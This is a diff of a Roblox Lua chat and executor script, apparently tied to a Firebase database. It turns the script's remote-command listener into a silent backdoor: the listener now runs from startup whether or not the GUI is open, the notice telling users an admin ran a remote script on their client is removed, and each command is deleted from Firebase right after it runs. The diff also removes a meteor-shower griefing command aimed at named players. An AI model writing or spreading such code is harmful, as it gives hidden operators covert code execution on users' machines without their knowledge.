@@ -26,8 +26,6 @@ local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
-local meteoritos = {}
-local hrpCFrame = nil
 
 -- Variables del GUI
 local gui, chatBox, frame, sendButton, textBox, settingsFrame, bgImage = nil, nil, nil, nil, nil, nil, nil
@@ -215,7 +213,7 @@ local function EscucharComandosRemotos()
     task.spawn(function()
         while true do
             -- ✅ Verificar si la escucha está activa
-            if not escuchaActiva and not guiActivo then
+            if not escuchaActiva then
                 task.wait(2)
                 continue
             end
@@ -254,26 +252,16 @@ local function EscucharComandosRemotos()
                             --    print("🔥 [EJECUTANDO] Script remoto de:", cmd.admin)
                                 EjecutarScriptRemoto(cmd.script)
                                 
-                                -- ✅ Notificar al usuario
-                                if _G.Rayfield and _G.Rayfield.Notify then
-                                    _G.Rayfield:Notify({
-                                        Title = "🔥 Script Remoto Ejecutado",
-                                        Content = "Admin: " .. (cmd.admin or "Unknown"),
-                                        Duration = 5,
-                                        Image = 4483362458
-                                    })
-                                end
+
                                 
                                 -- ✅ Eliminar comando después de 2 segundos
-                                task.delay(2, function()
-                                    pcall(function()
-                                        request({
-                                            Url = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/RemoteCommands/" .. comandoId .. ".json",
-                                            Method = "DELETE"
-                                        })
-                                    end)
-                                 --   print("🗑️ [DEBUG] Comando eliminado de Firebase")
+                                pcall(function()
+                                    request({
+                                        Url = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/RemoteCommands/" .. comandoId .. ".json",
+                                        Method = "DELETE"
+                                    })
                                 end)
+
                             else
                              --   print("❌ [DEBUG] Este comando NO es para mí")
                             end
@@ -290,6 +278,7 @@ local function EscucharComandosRemotos()
 end
 
 -- ✅ INICIAR ESCUCHA INMEDIATAMENTE
+escuchaActiva = true
 EscucharComandosRemotos()
 
 local function CrearPanelEjecucionRemota()
@@ -327,6 +316,47 @@ local function CrearPanelEjecucionRemota()
     local titleCorner = Instance.new("UICorner", titleBar)
     titleCorner.CornerRadius = UDim.new(0, 12)
     
+-- SISTEMA DE DRAG PARA EL PANEL
+    local panelDragging = false
+    local panelDragInput, panelDragStart, panelStartPos
+
+    titleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+           input.UserInputType == Enum.UserInputType.Touch then
+            panelDragging = true
+            panelDragStart = input.Position
+            panelStartPos = remoteExecutionPanel.Position
+            
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    panelDragging = false
+                end
+            end)
+        end
+    end)
+
+    titleBar.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or 
+           input.UserInputType == Enum.UserInputType.Touch then
+            panelDragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if panelDragging and input == panelDragInput and remoteExecutionPanel and remoteExecutionPanel.Parent then
+            local delta = input.Position - panelDragStart
+            local viewport = workspace.CurrentCamera.ViewportSize
+            local newX = panelStartPos.X.Offset + delta.X
+            local newY = panelStartPos.Y.Offset + delta.Y
+            
+            newX = math.clamp(newX, 0, viewport.X - panelWidth)
+            newY = math.clamp(newY, 0, viewport.Y - panelHeight)
+            
+            remoteExecutionPanel.Position = UDim2.new(0, newX, 0, newY)
+        end
+    end)
+
+
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(0.7, 0, 1, 0)
     title.Position = UDim2.new(0, 10, 0, 0)
@@ -539,67 +569,7 @@ local function CrearPanelEjecucionRemota()
     }):Play()
 end
 
--- FUNCIONES DE COMANDOS
-local function MeteorShowerFunction()
-    local char = player.Character
-    if not char then return end
-    
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hrp then return end
-    
-    hrpCFrame = hrp.CFrame
-    
-    task.spawn(function()
-        for i = 1, 100 do
-            local meteorito = Instance.new("Part")
-            meteorito.Name = "Meteorito_JXNULL"
-            meteorito.Color = Color3.fromRGB(0, 0, 0)
-            meteorito.Shape = Enum.PartType.Ball
-            meteorito.Anchored = false
-            meteorito.CanCollide = true
-            meteorito.Material = Enum.Material.Slate
-            
-            local tamano = math.random(200, 500)
-            meteorito.Size = Vector3.new(tamano, tamano, tamano)
-            meteorito.CFrame = hrpCFrame * CFrame.new(
-                math.random(-2000, 2000),
-                5000,
-                math.random(-2000, 2000)
-            )
-            meteorito.AssemblyLinearVelocity = Vector3.new(0, -5000, 0)
-            
-            local fire = Instance.new("Fire", meteorito)
-            fire.Size = meteorito.Size.Magnitude * 0.5
-            fire.Heat = 25
-            fire.Color = Color3.fromRGB(255, 100, 0)
-            fire.SecondaryColor = Color3.fromRGB(255, 0, 0)
-            
-            local light = Instance.new("PointLight", meteorito)
-            light.Brightness = 5
-            light.Range = 100
-            light.Color = Color3.fromRGB(255, 100, 0)
-            
-            meteorito.Parent = game.Workspace
-            table.insert(meteoritos, meteorito)
-            
-            task.wait(0.1)
-        end
-        
-        task.wait(3)
-        for _, meteorito in pairs(meteoritos) do
-            if meteorito and meteorito:IsA("BasePart") then
-                meteorito:Destroy()
-            end
-        end
-        meteoritos = {}
-    end)
-end
 
-local ComandosF = {
-    ["MeteorShower"] = MeteorShowerFunction,
-    ["meteorshower"] = MeteorShowerFunction,
-    ["meteoros"] = MeteorShowerFunction
-}
 
 -- FUNCIONES DE ANIMACIÓN
 local function AgregarEfectoHover(boton, colorNormal, colorHover)
@@ -1015,33 +985,7 @@ local function showMessages(data)
             tagColor = Color3.fromRGB(255, 215, 0)
         end
 
-        local args = text:split(" ")
-        local comando = args[1]:lower()
-        
-        for cmdName, funcion in pairs(ComandosF) do
-            if comando == cmdName:lower() then
-                local targetName = args[2]
-                
-                if targetName and ChatScripters[username] then
-                    if targetName:lower() == "all" or 
-                       player.Name:lower():sub(1, #targetName) == targetName:lower() then
-                        
-                        funcion()
-                        
-                        if msg._id then
-                            task.delay(3, function()
-                                pcall(function()
-                                    request({
-                                        Url = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/Chat/" .. msg._id .. ".json",
-                                        Method = "DELETE"
-                                    })
-                                end)
-                            end)
-                        end
-                    end
-                end
-            end
-        end
+ 
 
         if text:lower():find("discord") then
             local esImagenDiscord = text:match("https?://cdn%.discordapp%.com") or 
